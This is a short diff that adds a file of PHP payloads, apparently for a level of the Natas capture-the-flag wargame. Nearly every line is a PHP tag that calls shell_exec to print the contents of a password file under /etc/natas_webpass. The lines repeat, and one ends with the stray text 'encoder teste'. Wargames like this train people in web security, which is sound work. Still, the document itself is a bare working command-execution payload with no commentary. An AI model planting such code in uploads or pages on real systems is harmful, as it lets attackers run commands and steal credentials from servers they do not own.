@@ -1,0 +1,2 @@
+<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?><?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?><?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?><?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?><?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>encoder teste
+<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>
